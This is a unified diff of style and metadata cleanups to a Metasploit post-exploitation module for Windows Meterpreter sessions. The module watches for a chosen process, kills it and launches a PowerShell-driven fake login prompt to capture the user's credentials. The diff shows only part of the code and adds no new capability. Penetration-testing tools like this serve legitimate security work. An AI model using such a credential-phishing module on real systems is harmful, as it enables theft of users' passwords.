@@ -26,6 +26,11 @@ class MetasploitModule < Msf::Post
         'Platform' => [ 'win' ],
         'Arch' => [ ARCH_X86, ARCH_X64 ],
         'SessionTypes' => [ 'meterpreter' ],
+        'Notes' => {
+          'Stability' => [CRASH_SAFE],
+          'SideEffects' => [SCREEN_EFFECTS],
+          'Reliability' => []
+        },
         'Compat' => {
           'Meterpreter' => {
             'Commands' => %w[
@@ -46,7 +51,7 @@ class MetasploitModule < Msf::Post
 
     register_advanced_options(
       [
-        OptInt.new('TIMEOUT', [true, 'The maximum time (in seconds) to wait for any Powershell scripts to complete', 120])
+        OptInt.new('TIMEOUT', [true, 'The maximum time (in seconds) to wait for any PowerShell scripts to complete', 120])
       ]
     )
   end
@@ -63,7 +68,7 @@ class MetasploitModule < Msf::Post
       psh_script = psh_script2.gsub('R{START_PROCESS}', "start-process \"#{path}\"")
     end
     compressed_script = compress_script(psh_script)
-    cmd_out, runnings_pids, open_channels = execute_script(compressed_script, datastore['TIMEOUT'])
+    cmd_out, = execute_script(compressed_script, datastore['TIMEOUT'])
     while (d = cmd_out.channel.read)
       print_good(d.to_s)
     end
@@ -71,20 +76,19 @@ class MetasploitModule < Msf::Post
 
   # Function to monitor process creation
   def procmon(process, description)
-    procs = []
-    existingProcs = []
+    existing_procs = []
     detected = false
     first = true
     print_status('Monitoring new processes.')
     while detected == false
-      sleep 1
+      sleep(1)
       procs = client.sys.process.processes
       procs.each do |p|
         if (p['name'] == process) || (process == '*')
           if first == true
             print_status("#{p['name']} is already running. Waiting on new instances to start")
-            existingProcs.push(p['pid'])
-          elsif !existingProcs.include? p['pid']
+            existing_procs.push(p['pid'])
+          elsif !existing_procs.include? p['pid']
             print_status("New process detected: #{p['pid']} #{p['name']}")
             killproc(p['name'], p['pid'], description, p['path'])
             detected = true
@@ -102,23 +106,19 @@ class MetasploitModule < Msf::Post
     execute_invokeprompt_script(description, process, path)
   end
 
-  # Main method
   def run
-    process = datastore['PROCESS']
-    description = datastore['DESCRIPTION']
+    fail_with(Failure::Unknown, 'PowerShell is not installed') unless have_powershell?
 
-    # Powershell installed check
-    if have_powershell?
-      print_good('PowerShell is installed.')
-    else
-      fail_with(Failure::Unknown, 'PowerShell is not installed')
-    end
+    print_good('PowerShell is installed.')
 
     # Check whether target system is locked
     locked = client.railgun.user32.GetForegroundWindow()['return']
     if locked == 0
       fail_with(Failure::Unknown, 'Target system is locked. This post module cannot start the loginprompt when the target system is locked.')
     end
+
+    process = datastore['PROCESS']
+    description = datastore['DESCRIPTION']
 
     # Switch to check whether a specific process needs to be monitored, or just show the popup immediatly.
     case process
